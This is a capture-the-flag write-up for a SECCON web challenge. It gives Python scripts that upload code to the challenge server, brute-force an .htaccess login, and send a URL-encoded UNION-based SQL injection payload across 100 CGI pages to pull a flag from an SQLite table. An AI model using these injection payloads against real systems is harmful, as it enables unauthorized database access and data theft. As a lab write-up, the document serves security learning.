# uncomfortable web (web, 300, 78 solves)

> Attack to http://127.0.0.1:81/authed/ through the uploaded script at http://uncomfortableweb.pwn.seccon.jp/.

> Get the flag in the database!

We start off by making a quick script to quickly send our python scripts:

``` python
h = HTMLParser()

url = "http://uncomfortableweb.pwn.seccon.jp/?"
files = {'file': open('uncom.py', 'rb')}

r = requests.post(url=url, files=files)
print(h.unescape(r.text[290:-436]))
```

After a quick traversal, we notice two interesting things:

* `127.0.0.1:81/select.cgi`
* `127.0.0.1:81/authed/sqlinj/`



First link allows us to get the .htaccess file from `authed` directory, which we can brute and get the login/pass.

As for the second link, the directory's name strongly suggest a sql injection, there are 100 cgi files insides, so we can guess, that only one/few of them actually have sqli in them. 


Let's try to inject `' or '1'='1` into every page: 

``` python
conn = httplib.HTTPConnection('127.0.0.1', 81)
headers = {}
headers["Authorization"] = "Basic {0}".format(base64.b64encode("{0}:{1}".format('keigo', 'test')))

for i in range(100):
	conn.request("GET", "/authed/sqlinj/{}}.cgi?no=".format(str(i))+urllib.quote_plus("4a' or '1'='1' union SELECT *, null, null FROM f1ags /*"), None, headers)
	res = conn.getresponse()
	print(res.read().decode("utf-8"))
	
conn.close()
```

The important thing here, is that we urlencode the payload, it wouldn't work otherwise.
In return we get:

```
.
.
.
70 link
71 link
72 link
ISBN-10: 4822267865
ISBN-13: 978-4822267865
PUBLISH: 2015/2/20
ISBN-10: 4822267911
ISBN-13: 978-4822267919
PUBLISH: 2015/8/27

ISBN-10: 4822267938
ISBN-13: 978-4822267933
PUBLISH: 2016/2/19

ISBN-10: 4822237842
ISBN-13: 978-4822237844
PUBLISH: 2016/8/25

73 link
.
.
.
```

Success!

The db turns out to be sqlite, after some fiddling with the `sqlite_master` table, we finally arrive with the final exploit: `SECCON{I want to eventually make a CGC web edition... someday...}`



